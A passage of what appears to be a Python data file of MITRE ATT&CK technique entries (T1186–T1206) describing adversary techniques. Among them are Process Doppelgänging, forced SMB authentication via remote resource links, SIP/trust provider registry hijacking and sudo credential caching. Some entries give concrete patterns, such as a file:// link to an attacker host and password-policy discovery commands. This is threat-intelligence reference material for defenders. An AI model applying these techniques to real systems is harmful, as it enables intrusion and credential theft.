                          'or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n'
                          '\n'
                          'Although deprecated, the TxF application programming interface (API) is still enabled as of '
                          'Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n'
                          '\n'
                          'Adversaries may leverage TxF to a perform a file-less variation of [Process '
                          'Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelgänging. Similar '
                          'to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelgänging '
                          'involves replacing the memory of a legitimate process, enabling the veiled execution of '
                          "malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF "
                          'also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, '
                          'VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec '
                          '2017)\n'
                          '\n'
                          'Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging '
                          'Dec 2017):\n'
                          '\n'
                          '* Transact – Create a TxF transaction using a legitimate executable then overwrite the file '
                          'with malicious code. These changes will be isolated and only visible within the context of '
                          'the transaction.\n'
                          '* Load – Create a shared section of memory and load the malicious executable.\n'
                          '* Rollback – Undo changes to original executable, effectively removing malicious code from '
                          'the file system.\n'
                          '* Animate – Create a process from the tainted section of memory and initiate execution.',
           'name': 'Process Doppelgänging',
           'platforms': ['Windows']},
 'T1187': {'attack_id': 'T1187',
           'categories': ['credential-access'],
           'description': 'The Server Message Block (SMB) protocol is commonly used in Windows networks for '
                          'authentication and communication between systems for access to resources and file sharing. '
                          'When a Windows system attempts to connect to an SMB resource it will automatically attempt '
                          'to authenticate and send credential information for the current user to the remote system. '
                          '(Citation: Wikipedia Server Message Block) This behavior is typical in enterprise '
                          'environments so that users do not need to enter credentials to access network resources. '
                          'Web Distributed Authoring and Versioning (WebDAV) is typically used by Windows systems as a '
                          'backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will '
                          'typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) '
                          '(Citation: Microsoft Managing WebDAV Security)\n'
                          '\n'
                          'Adversaries may take advantage of this behavior to gain access to user account hashes '
                          'through forced SMB authentication. An adversary can send an attachment to a user through '
                          'spearphishing that contains a resource link to an external server controlled by the '
                          'adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place '
                          'a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed '
                          "on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's "
                          'system accesses the untrusted resource it will attempt authentication and send information '
                          "including the user's hashed credentials over SMB to the adversary controlled server. "
                          '(Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform '
                          'off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access '
                          'to plaintext credentials. (Citation: Cylance Redirect to SMB)\n'
                          '\n'
                          'There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) '
                          'Some specifics from in-the-wild use include:\n'
                          '\n'
                          '* A spearphishing attachment containing a document with a resource that is automatically '
                          'loaded when the document is opened (i.e. [Template '
                          'Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for '
                          'example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger '
                          'the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n'
                          '* A modified .LNK or .SCF file with the icon filename pointing to an external reference '
                          'such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the '
                          'resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT '
                          'Energy Oct 2017)',
           'name': 'Forced Authentication',
           'platforms': ['Windows']},
 'T1188': {'attack_id': 'T1188',
           'categories': ['command-and-control'],
           'description': 'To disguise the source of malicious traffic, adversaries may chain together multiple '
                          'proxies. Typically, a defender will be able to identify the last proxy traffic traversed '
                          'before it enters their network; the defender may or may not be able to identify any '
                          'previous proxies before the last-hop proxy. This technique makes identifying the original '
                          'source of the malicious traffic even more difficult by requiring the defender to trace '
                          'malicious traffic through several proxies to identify its source.',
           'name': 'Multi-hop Proxy',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1189': {'attack_id': 'T1189',
           'categories': ['initial-access'],
           'description': 'A drive-by compromise is when an adversary gains access to a system through a user visiting '
                          "a website over the normal course of browsing. With this technique, the user's web browser "
                          'is typically targeted for exploitation, but adversaries may also use compromised websites '
                          'for non-exploitation behavior such as acquiring application access tokens.\n'
                          '\n'
                          'Multiple ways of delivering exploit code to a browser exist, including:\n'
                          '\n'
                          '* A legitimate website is compromised where adversaries have injected some form of '
                          'malicious code such as JavaScript, iFrames, and cross-site scripting.\n'
                          '* Malicious ads are paid for and served through legitimate ad providers.\n'
                          '* Built-in web application interfaces are leveraged for the insertion of any other kind of '
                          'object that can be used to display web content or contain a script that executes on the '
                          'visiting client (e.g. forum posts, comments, and other user controllable web content).\n'
                          '\n'
                          'Often the website used by an adversary is one visited by a specific community, such as '
                          'government, a particular industry, or region, where the goal is to compromise a specific '
                          'user or set of users based on a shared interest. This kind of targeted attack is referred '
                          'to a strategic web compromise or watering hole attack. There are several known examples of '
                          'this occurring. (Citation: Shadowserver Strategic Web Compromise)\n'
                          '\n'
                          'Typical drive-by compromise process:\n'
                          '\n'
                          '1. A user visits a website that is used to host the adversary controlled content.\n'
                          '2. Scripts automatically execute, typically searching versions of the browser and plugins '
                          'for a potentially vulnerable version. \n'
                          '    * The user may be required to assist in this process by enabling scripting or active '
                          'website components and ignoring warning dialog boxes.\n'
                          '3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n'
                          '4. If exploitation is successful, then it will give the adversary code execution on the '
                          "user's system unless other protections are in place.\n"
                          '    * In some cases a second visit to the website after the initial scan is required before '
                          'exploit code is delivered.\n'
                          '\n'
                          'Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the '
                          'focus of this technique is to exploit software on a client endpoint upon visiting a '
                          'website. This will commonly give an adversary access to systems on the internal network '
                          'instead of external systems that may be in a DMZ.\n'
                          '\n'
                          'Adversaries may also use compromised websites to deliver a user to a malicious application '
                          'designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, '
                          'like OAuth tokens, to gain access to protected applications and information. These '
                          'malicious applications have been delivered through popups on legitimate websites.(Citation: '
                          'Volexity OceanLotus Nov 2017)',
           'name': 'Drive-by Compromise',
           'platforms': ['Windows', 'Linux', 'macOS', 'SaaS']},
 'T1190': {'attack_id': 'T1190',
           'categories': ['initial-access'],
           'description': 'The use of software, data, or commands to take advantage of a weakness in an '
                          'Internet-facing computer system or program in order to cause unintended or unanticipated '
                          'behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. '
                          'These applications are often websites, but can include databases (like SQL)(Citation: NVD '
                          'CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or '
                          'SSH), and any other applications with Internet accessible open sockets, such as web servers '
                          'and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited '
                          'this may include [Exploitation for Defense '
                          'Evasion](https://attack.mitre.org/techniques/T1211).\n'
                          '\n'
                          'If an application is hosted on cloud-based infrastructure, then exploiting it may lead to '
                          'compromise of the underlying instance. This can allow an adversary a path to access the '
                          'cloud APIs or to take advantage of weak identity and access management policies.\n'
                          '\n'
                          'For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common '
                          'web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)',
           'name': 'Exploit Public-Facing Application',
           'platforms': ['Linux', 'Windows', 'macOS', 'AWS', 'GCP', 'Azure']},
 'T1191': {'attack_id': 'T1191',
           'categories': ['defense-evasion', 'execution'],
           'description': 'The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program '
                          'used to install Connection Manager service profiles. (Citation: Microsoft Connection '
                          'Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter '
                          'and installs a service profile leveraged for remote access connections.\n'
                          '\n'
                          'Adversaries may supply CMSTP.exe with INF files infected with malicious commands. '
                          '(Citation: Twitter CMSTP Usage Jan 2018) Similar to '
                          '[Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be '
                          'abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets '
                          '(SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate '
                          'AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass '
                          'AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft '
                          'application.\n'
                          '\n'
                          'CMSTP.exe can also be abused to [Bypass User Account '
                          'Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a '
                          'malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) '
                          '(Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)',
           'name': 'CMSTP',
           'platforms': ['Windows']},
 'T1192': {'attack_id': 'T1192',
           'categories': ['initial-access'],
           'description': 'Spearphishing with a link is a specific variant of spearphishing. It is different from '
                          'other forms of spearphishing in that it employs the use of links to download malware '
                          'contained in email, instead of attaching malicious files to the email itself, to avoid '
                          'defenses that may inspect email attachments. \n'
                          '\n'
                          'All forms of spearphishing are electronically delivered social engineering targeted at a '
                          'specific individual, company, or industry. In this case, the malicious emails contain '
                          'links. Generally, the links will be accompanied by social engineering text and require the '
                          'user to actively click or copy and paste a URL into a browser, leveraging [User '
                          'Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise '
                          'the web browser using an exploit, or the user will be prompted to download applications, '
                          'documents, zip files, or even executables depending on the pretext for the email in the '
                          'first place. Adversaries may also include links that are intended to interact directly with '
                          'an email reader, including embedded images intended to exploit the end system directly or '
                          'verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to '
                          'malicious applications  designed to [Steal Application Access '
                          'Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain '
                          'access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth '
                          '2017)',
           'name': 'Spearphishing Link',
           'platforms': ['Windows', 'macOS', 'Linux', 'Office 365', 'SaaS']},
 'T1193': {'attack_id': 'T1193',
           'categories': ['initial-access'],
           'description': 'Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment '
                          'is different from other forms of spearphishing in that it employs the use of malware '
                          'attached to an email. All forms of spearphishing are electronically delivered social '
                          'engineering targeted at a specific individual, company, or industry. In this scenario, '
                          'adversaries attach a file to the spearphishing email and usually rely upon [User '
                          'Execution](https://attack.mitre.org/techniques/T1204) to gain execution.\n'
                          '\n'
                          'There are many options for the attachment such as Microsoft Office documents, executables, '
                          'PDFs, or archived files. Upon opening the attachment (and potentially clicking past '
                          "protections), the adversary's payload exploits a vulnerability or directly executes on the "
                          "user's system. The text of the spearphishing email usually tries to give a plausible reason "
                          'why the file should be opened, and may explain how to bypass system protections in order to '
                          'do so. The email may also contain instructions on how to decrypt an attachment, such as a '
                          'zip file password, in order to evade email boundary defenses. Adversaries frequently '
                          'manipulate file extensions and icons in order to make attached executables appear to be '
                          'document files, or files exploiting one application appear to be a file for a different '
                          'one.',
           'name': 'Spearphishing Attachment',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1194': {'attack_id': 'T1194',
           'categories': ['initial-access'],
           'description': 'Spearphishing via service is a specific variant of spearphishing. It is different from '
                          'other forms of spearphishing in that it employs the use of third party services rather than '
                          'directly via enterprise email channels. \n'
                          '\n'
                          'All forms of spearphishing are electronically delivered social engineering targeted at a '
                          'specific individual, company, or industry. In this scenario, adversaries send messages '
                          'through various social media services, personal webmail, and other non-enterprise '
                          'controlled services. These services are more likely to have a less-strict security policy '
                          'than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport '
                          "with the target or get the target's interest in some way. Adversaries will create fake "
                          'social media accounts and message employees for potential job opportunities. Doing so '
                          "allows a plausible reason for asking about services, policies, and software that's running "
                          'in an environment. The adversary can then send malicious links or attachments through these '
                          'services.\n'
                          '\n'
                          'A common example is to build rapport with a target via social media, then send content to a '
                          'personal webmail service that the target uses on their work computer. This allows an '
                          'adversary to bypass some email restrictions on the work account, and the target is more '
                          "likely to open the file since it's something they were expecting. If the payload doesn't "
                          'work as expected, the adversary can continue normal communications and troubleshoot with '
                          'the target on how to get it working.',
           'name': 'Spearphishing via Service',
           'platforms': ['Windows', 'macOS', 'Linux']},
 'T1195': {'attack_id': 'T1195',
           'categories': ['initial-access'],
           'description': 'Supply chain compromise is the manipulation of products or product delivery mechanisms '
                          'prior to receipt by a final consumer for the purpose of data or system compromise. \n'
                          '\n'
                          'Supply chain compromise can take place at any stage of the supply chain including:\n'
                          '\n'
                          '* Manipulation of development tools\n'
                          '* Manipulation of a development environment\n'
                          '* Manipulation of source code repositories (public or private)\n'
                          '* Manipulation of source code in open-source dependencies\n'
                          '* Manipulation of software update/distribution mechanisms\n'
                          '* Compromised/infected system images (multiple cases of removable media infected at the '
                          'factory) (Citation: IBM Storwize) (Citation: Schneider Electric USB Malware) \n'
                          '* Replacement of legitimate software with modified versions\n'
                          '* Sales of modified/counterfeit products to legitimate distributors\n'
                          '* Shipment interdiction\n'
                          '\n'
                          'While supply chain compromise can impact any component of hardware or software, attackers '
                          'looking to gain execution have often focused on malicious additions to legitimate software '
                          'in software distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation: '
                          'Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be specific to a '
                          'desired victim set (Citation: Symantec Elderwood Sept 2012) or malicious software may be '
                          'distributed to a broad set of consumers but only move on to additional tactics on specific '
                          'victims. (Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011) Popular open '
                          'source projects that are used as dependencies in many applications may also be targeted as '
                          'a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM '
                          'Compromise)',
           'name': 'Supply Chain Compromise',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1196': {'attack_id': 'T1196',
           'categories': ['defense-evasion', 'execution'],
           'description': 'Windows Control Panel items are utilities that allow users to view and adjust computer '
                          'settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) '
                          'files, the latter are actually renamed dynamic-link library (.dll) files that export a '
                          'CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL '
                          'Malware Jan 2014) Control Panel items can be executed directly from the command line, '
                          'programmatically via an application programming interface (API) call, or by simply '
                          'double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL '
                          'Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)\n'
                          '\n'
                          'For ease of use, Control Panel items typically include graphical menus available to users '
                          'after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing '
                          'CPL)\n'
                          '\n'
                          'Adversaries can use Control Panel items as execution payloads to execute arbitrary '
                          'commands. Malicious Control Panel items can be delivered via [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL '
                          'Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of '
                          'multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, '
                          'specifically CPL files, may also bypass application and/or file extension whitelisting.',
           'name': 'Control Panel Items',
           'platforms': ['Windows']},
 'T1197': {'attack_id': 'T1197',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous '
                          'file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft '
                          'COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other '
                          'applications preferred to operate in the background (using available idle bandwidth) '
                          'without interrupting other networked applications. File transfer tasks are implemented as '
                          'BITS jobs, which contain a queue of one or more file operations.\n'
                          '\n'
                          'The interface to create and manage BITS jobs is accessible through '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the '
                          '[BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)\n'
                          '\n'
                          'Adversaries may abuse BITS to download, execute, and even clean up after running malicious '
                          'code. BITS tasks are self-contained in the BITS job database, without new files or registry '
                          'modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June '
                          '2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) '
                          'BITS enabled execution may also allow Persistence by creating long-standing jobs (the '
                          'default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a '
                          'job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov '
                          '2017) (Citation: CTU BITS Malware June 2016)\n'
                          '\n'
                          'BITS upload functionalities can also be used to perform [Exfiltration Over Alternative '
                          'Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June '
                          '2016)',
           'name': 'BITS Jobs',
           'platforms': ['Windows']},
 'T1198': {'attack_id': 'T1198',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures '
                          "are used to verify a file's origin and integrity, variables that may be used to establish "
                          'trust in signed code (ex: a driver with a valid Microsoft signature may be handled as '
                          'safe). The signature validation process is handled via the WinVerifyTrust application '
                          'programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts '
                          'an inquiry and coordinates with the appropriate trust provider, which is responsible for '
                          'validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n'
                          '\n'
                          'Because of the varying executable file types and corresponding signature formats, Microsoft '
                          'created software components called Subject Interface Packages (SIPs) (Citation: '
                          'EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and '
                          'files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and '
                          'verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, '
                          'Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog '
                          'Files and Signatures April 2017)) and are identified by globally unique identifiers '
                          '(GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n'
                          '\n'
                          'Similar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse '
                          'this architecture to subvert trust controls and bypass security policies that allow only '
                          'legitimately signed code to execute on a system. Adversaries may hijack SIP and trust '
                          'provider components to mislead operating system and whitelisting tools to classify '
                          'malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n'
                          '\n'
                          '* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in '
                          '<code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType '
                          '0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library '
                          '(DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded '
                          'digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an '
                          'exported function that always returns a known good signature value (ex: a Microsoft '
                          'signature for Portable Executables) rather than the file’s real signature, an adversary can '
                          'apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept '
                          '2017) (although a hash mismatch will likely occur, invalidating the signature, since the '
                          'hash returned by the function will not match the value computed from the file).\n'
                          '* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in '
                          '<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType '
                          '0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP’s '
                          'CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the '
                          'signed hash value. By pointing to a maliciously-crafted DLL with an exported function that '
                          'always returns TRUE (indicating that the validation was successful), an adversary can '
                          'successfully validate any file (with a legitimate signature) using that SIP (Citation: '
                          'GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned '
                          'CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a '
                          'suitable exported function from an already present DLL, avoiding the requirement to drop '
                          'and execute a new file on disk.\n'
                          '* Modifying the <code>DLL</code> and <code>Function</code> Registry values in '
                          '<code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust '
                          'provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy '
                          'function, which is where the decoded and parsed signature is checked and the majority of '
                          'trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData '
                          'function, this value can be redirected to a suitable exported function from an already '
                          'present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is '
                          'complex).\n'
                          '* **Note:** The above hijacks are also possible without modifying the Registry via [DLL '
                          'Search Order Hijacking](https://attack.mitre.org/techniques/T1038).\n'
                          '\n'
                          'Hijacking SIP or trust provider components can also enable persistent code execution, since '
                          'these malicious components may be invoked by any application that performs code signing or '
                          'signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)',
           'name': 'SIP and Trust Provider Hijacking',
           'platforms': ['Windows']},
 'T1199': {'attack_id': 'T1199',
           'categories': ['initial-access'],
           'description': 'Adversaries may breach or otherwise leverage organizations who have access to intended '
                          'victims. Access through trusted third party relationship exploits an existing connection '
                          'that may not be protected or receives less scrutiny than standard mechanisms of gaining '
                          'access to a network.\n'
                          '\n'
                          'Organizations often grant elevated access to second or third-party external providers in '
                          'order to allow them to manage internal systems as well as cloud-based environments. Some '
                          'examples of these relationships include IT services contractors, managed security '
                          'providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The '
                          "third-party provider's access may be intended to be limited to the infrastructure being "
                          'maintained, but may exist on the same network as the rest of the enterprise. As such, '
                          '[Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for '
                          'access to internal network systems may be compromised and used.',
           'name': 'Trusted Relationship',
           'platforms': ['Linux', 'Windows', 'macOS', 'AWS', 'GCP', 'Azure', 'SaaS']},
 'T1200': {'attack_id': 'T1200',
           'categories': ['initial-access'],
           'description': 'Adversaries may introduce computer accessories, computers, or networking hardware into a '
                          'system or network that can be used as a vector to gain access. While public references of '
                          'usage by APT groups are scarce, many penetration testers leverage hardware additions for '
                          'initial access. Commercial and open source products are leveraged with capabilities such as '
                          'passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption '
                          'breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck '
                          'Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new '
                          'wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.',
           'name': 'Hardware Additions',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1201': {'attack_id': 'T1201',
           'categories': ['discovery'],
           'description': 'Password policies for networks are a way to enforce complex passwords that are difficult to '
                          'guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An '
                          'adversary may attempt to access detailed information about the password policy used within '
                          'an enterprise network. This would help the adversary to create a list of common passwords '
                          'and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the '
                          "minimum password length should be 8, then not trying passwords such as 'pass123'; not "
                          'checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock '
                          'out accounts).\n'
                          '\n'
                          'Password policies can be set and discovered on Windows, Linux, and macOS systems. '
                          '(Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)\n'
                          '\n'
                          '### Windows\n'
                          '* <code>net accounts</code>\n'
                          '* <code>net accounts /domain</code>\n'
                          '\n'
                          '### Linux\n'
                          '* <code>chage -l <username></code>\n'
                          '* <code>cat /etc/pam.d/common-password</code>\n'
                          '\n'
                          '### macOS\n'
                          '* <code>pwpolicy getaccountpolicies</code>',
           'name': 'Password Policy Discovery',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1202': {'attack_id': 'T1202',
           'categories': ['defense-evasion'],
           'description': 'Various Windows utilities may be used to execute commands, possibly without invoking '
                          '[cmd](https://attack.mitre.org/software/S0106). For example, '
                          '[Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant '
                          '(pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other '
                          'utilities may invoke the execution of programs and commands from a [Command-Line '
                          'Interface](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. '
                          '(Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n'
                          '\n'
                          'Adversaries may abuse these features for [Defense '
                          'Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary '
                          'execution while subverting detections and/or mitigation controls (such as Group Policy) '
                          'that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file '
                          'extensions more commonly associated with malicious payloads.',
           'name': 'Indirect Command Execution',
           'platforms': ['Windows']},
 'T1203': {'attack_id': 'T1203',
           'categories': ['execution'],
           'description': 'Vulnerabilities can exist in software due to unsecure coding practices that can lead to '
                          'unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through '
                          'targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most '
                          'valuable exploits to an offensive toolkit are those that can be used to obtain code '
                          'execution on a remote system because they can be used to gain access to that system. Users '
                          'will expect to see files related to the applications they commonly used to do work, so they '
                          'are a useful target for exploit research and development because of their high utility.\n'
                          '\n'
                          'Several types exist:\n'
                          '\n'
                          '### Browser-based Exploitation\n'
                          '\n'
                          'Web browsers are a common target through [Drive-by '
                          'Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing '
                          'Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised '
                          'through normal web browsing or from certain users being targeted by links in spearphishing '
                          'emails to adversary controlled sites used to exploit the web browser. These often do not '
                          'require an action by the user for the exploit to be executed.\n'
                          '\n'
                          '### Office Applications\n'
                          '\n'
                          'Common office and productivity applications such as Microsoft Office are also targeted '
                          'through [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193), '
                          '[Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via '
                          'Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted '
                          'directly as attachments or through links to download them. These require the user to open '
                          'the document or file for the exploit to run.\n'
                          '\n'
                          '### Common Third-party Applications\n'
                          '\n'
                          'Other applications that are commonly seen or are part of the software deployed in a target '
                          'network may also be used for exploitation. Applications such as Adobe Reader and Flash, '
                          'which are common in enterprise environments, have been routinely targeted by adversaries '
                          'attempting to gain access to systems. Depending on the software and nature of the '
                          'vulnerability, some may be exploited in the browser or require the user to open a file. For '
                          'instance, some Flash exploits have been delivered as objects within Microsoft Office '
                          'documents.',
           'name': 'Exploitation for Client Execution',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1204': {'attack_id': 'T1204',
           'categories': ['execution'],
           'description': 'An adversary may rely upon specific actions by a user in order to gain execution. This may '
                          'be direct code execution, such as when a user opens a malicious executable delivered via '
                          '[Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) with the icon and '
                          'apparent extension of a document file. It also may lead to other execution techniques, such '
                          'as when a user clicks on a link delivered via [Spearphishing '
                          'Link](https://attack.mitre.org/techniques/T1192) that leads to exploitation of a browser or '
                          'application vulnerability via [Exploitation for Client '
                          'Execution](https://attack.mitre.org/techniques/T1203). Adversaries may use several types of '
                          'files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, '
                          '.lnk, .pif, and .cpl. \n'
                          '\n'
                          'As an example, an adversary may weaponize Windows Shortcut Files (.lnk) to bait a user into '
                          'clicking to execute the malicious payload.(Citation: Proofpoint TA505 June 2018) A '
                          'malicious .lnk file may contain [PowerShell](https://attack.mitre.org/techniques/T1086) '
                          'commands. Payloads may be included into the .lnk file itself, or be downloaded from a '
                          'remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex '
                          'April 2017) \n'
                          '\n'
                          'While User Execution frequently occurs shortly after Initial Access it may occur at other '
                          'phases of an intrusion, such as when an adversary places a file in a shared directory or on '
                          "a user's desktop hoping that a user will click on it.",
           'name': 'User Execution',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1205': {'attack_id': 'T1205',
           'categories': ['defense-evasion', 'persistence', 'command-and-control'],
           'description': 'Port Knocking is a well-established method used by both defenders and adversaries to hide '
                          'open ports from access. To enable a port, an adversary sends a series of packets with '
                          'certain characteristics before the port will be opened. Usually this series of packets '
                          'consists of attempted connections to a predefined sequence of closed ports, but can involve '
                          'unusual flags, specific strings or other unique characteristics. After the sequence is '
                          'completed, opening a port is often accomplished by the host based firewall, but could also '
                          'be implemented by custom software. \n'
                          '\n'
                          'This technique has been observed to both for the dynamic opening of a listening port as '
                          'well as the initiating of a connection to a listening server on a different system.\n'
                          '\n'
                          'The observation of the signal packets to trigger the communication can be conducted through '
                          'different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r '
                          '2002), is to use the libpcap libraries to sniff for the packets in question. Another method '
                          'leverages raw sockets, which enables the malware to use ports that are already open for use '
                          'by other programs.',
           'name': 'Port Knocking',
           'platforms': ['Linux', 'macOS']},
 'T1206': {'attack_id': 'T1206',
           'categories': ['privilege-escalation'],
           'description': 'The <code>sudo</code> command "allows a system administrator to delegate authority to give '
                          'certain users (or groups of users) the ability to run some (or all) commands as root or '
                          'another user while providing an audit trail of the commands and their arguments." '
                          '(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has '
                          'some useful configuration features such as a <code>timestamp_timeout</code> that is the '
                          'amount of time in minutes between instances of <code>sudo</code> before it will re-prompt '
                          'for a password. This is because <code>sudo</code> has the ability to cache credentials for '
                          'a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a '
                          'timestamp of when sudo was last run to determine this timeout. Additionally, there is a '
                          '<code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. '
                          'This means that, for example, the sudo timeout of one tty will not affect another tty (you '
                          'will have to type the password again).\n'
                          '\n'
                          'Adversaries can abuse poor configurations of this to escalate privileges without needing '
                          "the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it "
